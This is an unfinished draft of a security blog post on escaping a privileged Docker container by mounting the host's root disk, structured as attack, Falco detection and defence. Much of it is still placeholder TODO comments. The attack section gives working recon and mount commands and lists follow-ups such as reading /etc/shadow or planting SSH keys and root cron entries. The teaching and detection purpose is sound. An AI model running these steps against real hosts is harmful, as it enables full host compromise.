---
title: "Container Escapes: host device mount"
categories:
  - notes
  - container
header:
  teaser: /assets/images/posts/container/container-teaser5.jpg
  overlay_image: assets/images/posts/container/container-header4.jpg
  overlay_filter: 0.5
excerpt: "How a privileged container mounts the host's root disk directly, how Falco sees the mount, and the controls that stop it."
description: "A deep dive into the host device-mount container escape: the device access that lets a CAP_SYS_ADMIN container mount the host filesystem read-write, runtime detection with Falco, and the isolation defaults that neutralize it."
tags:
  - container
  - container-escapes
  - linux
  - security
  - offensive-security
---

# Intro

<!-- SKELETON — fill prose. Keep the attack/detect/defend cycle. -->

Second technique in the Container Escapes series. Same threat model as the opener (`--privileged`), different door.

Where `core_pattern` abused a writable `/proc/sys` and the usermode-helper mechanism, this one abuses the **other half of `--privileged`**: raw host device access plus the `mount` syscall. Same flag, new primitive.

<!-- TODO: one paragraph tying back to the core_pattern post; why device access is the second door. Non-CVE, still works on default Docker. -->

## Threat model

Same single misconfiguration: a privileged container.

```sh
docker run --privileged ...
```

<!-- TODO: recap what --privileged grants, but this time focus on the TWO items that matter here:
     - full capability set (CAP_SYS_ADMIN for mount, CAP_MKNOD)
     - host block devices visible in the container's /dev (no device cgroup restriction) -->

> [!] This does not apply to a default container. A default Docker container drops `CAP_SYS_ADMIN`, applies a device cgroup allowlist, and does not expose host block devices. The attack assumes elevated privilege was already handed over.

<!-- TODO: contrast with core_pattern in one line — that one wrote a file, this one mounts a disk. -->

---

# Background: devices, the device cgroup, and mount

<!-- TODO: the mechanism section (mirror of "how the kernel runs programs for you"). -->

## Block devices and /dev

<!-- TODO:
     - what a block device node is (major/minor), /dev/sda vs partitions
     - the host root filesystem lives on a block device
     - a container normally cannot see host block devices -->

## The device cgroup

<!-- TODO:
     - device cgroup = allowlist controlling which device nodes a container may open (c/b, major:minor, rwm)
     - default Docker: tight allowlist (null, zero, random, tty...), no host disks
     - --privileged: allowlist becomes "a *:* rwm" (everything) -->

## mount needs CAP_SYS_ADMIN

<!-- TODO:
     - mount(2) requires CAP_SYS_ADMIN in the container's user namespace
     - privileged container holds it, and mount is not blocked by the default seccomp profile in privileged mode
     - CAP_MKNOD lets the attacker recreate the device node if it is not already present -->

<!-- DIAGRAM SLOT: mirror the core_pattern SVGs. Suggested: device cgroup allowlist
     (default = short list -> blocked) vs privileged (a *:* rwm -> host disk reachable),
     then mount /dev/sdX -> host rootfs. Keep the same viewBox/style palette as the last post. -->

## Why it crosses the container boundary

<!-- TODO:
     - the block device IS the host's storage; mounting it gives the real host filesystem, not a copy
     - read/write /etc/shadow, drop SSH key, cron, chroot -> full host root
     - one-sentence version, same style as the core_pattern post -->

---

# Attack

## Lab setup

<!-- TODO: throwaway VM, default Docker. Same warning banner style. -->

{% raw %}
```sh
# confirm default docker: overlay2, no userns-remap
$ docker info --format '{{.Driver}} {{.SecurityOptions}}'
overlay2 [name=seccomp,profile=builtin name=cgroupns]
```
{% endraw %}

```sh
$ docker run --rm -it --privileged ubuntu:22.04 bash
```

## Recon

<!-- TODO: same "check how restricted you are" opening, no external tools. -->

```sh
# full capability set? (privileged tell)
root@ctr:/# grep CapEff /proc/self/status
CapEff: 000001ffffffffff

# what block devices can we see?
root@ctr:/# ls -la /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
root@ctr:/# lsblk
```

<!-- TODO: interpret — host disks visible == device cgroup is wide open. Identify the host root partition. -->

## The escape

<!-- TODO: three steps, same shape as the last post. -->

**1. Identify the host root block device.**

```sh
# TODO: findmnt / lsblk to find which /dev node backs host /
```

**2. Mount it read-write inside the container.**

```sh
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host      # <- adjust device
# if the node is missing but caps allow it: mknod first (CAP_MKNOD)
```

**3. Act as host root on the mounted filesystem.**

```sh
# TODO pick ONE clean proof for the post, e.g.:
#   - read /mnt/host/etc/shadow
#   - append an authorized_keys / a root cron entry
#   - chroot /mnt/host and run id / hostname
```

> [!] The mounted filesystem is the live host disk, not a copy. Writes land on the host immediately.

## Proof

<!-- TODO: show host-identity proof from inside the container, mirroring the core_pattern proof block
     (host hostname, host /etc, evidence the write persisted on the host). -->

```sh
root@ctr:/# cat /mnt/host/etc/hostname
# <host hostname, not the container id>
```

---

# Detect

<!-- TODO: same Falco framing. This escape is a mount() syscall + open of a host block device,
     which the default ruleset handles BETTER than the core_pattern write did — call that contrast out. -->

## Default rules

<!-- TODO: run stock Falco, repeat attack. Expected hits:
     - "Mount Launched in Privileged Container" (if enabled) / mount-related rule
     - "Terminal shell in container"
     Note which are default-enabled vs disabled-in-stable. -->

## A rule that catches the mechanism

<!-- TODO: Falco rule watching mount of a host block device from a container,
     and/or open_write on /dev/sd*|vd*|nvme* from container. Same YAML shape as the last post. -->

```yaml
- rule: Mount host block device from container
  desc: >
    A process inside a container issued mount(2) against a host block device.
    <!-- TODO finish desc; tie to T1611 -->
  condition: >
    <!-- TODO: evt.type = mount and container and fd/args match /dev/sd*, etc. -->
  output: >
    <!-- TODO -->
  priority: CRITICAL
  tags: [container, escape, mitre_privilege_escalation, T1611]
```

<!-- DIAGRAM SLOT: Falco alert card + round1/round2 comparison, same as last post. -->

## Detection gaps

<!-- TODO: what the rule misses (e.g. reading the raw device with dd instead of mount;
     device-mapper indirection; bind-mount tricks). -->

---

# Defend

## The single misconfiguration

<!-- TODO: everything traces back to --privileged. Remove it -> no CAP_SYS_ADMIN for mount,
     device cgroup blocks the disk, /dev has no host block nodes. -->

## Layered defenses

<!-- DIAGRAM SLOT: layered-defense table, same style as last post. Rows:
     no --privileged            -> removes every precondition
     drop CAP_SYS_ADMIN         -> mount() denied (EPERM)
     device cgroup allowlist    -> host disk not openable
     drop CAP_MKNOD             -> cannot recreate the device node
     no host device bind-mounts -> nothing to mount
     userns-remap               -> container root != host root (defense in depth) -->

<!-- TODO: prose explaining that removing any one precondition breaks it. -->

## Defaults done right

<!-- TODO: bctor mapping, same closing as last post. -->

Against this escape, a default [bctor](https://github.com/Johnermac/bctor) container:

- drops `CAP_SYS_ADMIN` and `CAP_MKNOD`, so `mount` and node creation are denied,
- applies a device cgroup allowlist, so host block devices cannot be opened,
- exposes no host block devices in `/dev`,
- sets `no_new_privs`.

<!-- TODO: which controls stop it outright vs harden. None off without an explicit flag. -->

---

# Conclusion

<!-- TODO: same three-bullet wrap (attack / detect / defend takeaway), then the shared-kernel line. -->

- <!-- attack takeaway: the block device is the host disk; --privileged makes it reachable -->
- <!-- detect takeaway: mount is noisier than the core_pattern write; default rules do better here -->
- <!-- defend takeaway: device cgroup + CAP_SYS_ADMIN each break it independently -->

> Next in the series I will take another escape through the same attack, detect, defend cycle.

Check the repo: [BCTOR GITHUB REPO](https://github.com/Johnermac/bctor)

> Follow me if this was useful. Hope you liked it! :)

# References

<!-- TODO: fill real references. Candidates:
https://man7.org/linux/man-pages/man2/mount.2.html
https://docs.kernel.org/admin-guide/cgroup-v1/devices.html
https://falco.org/docs/
https://attack.mitre.org/techniques/T1611/
-->
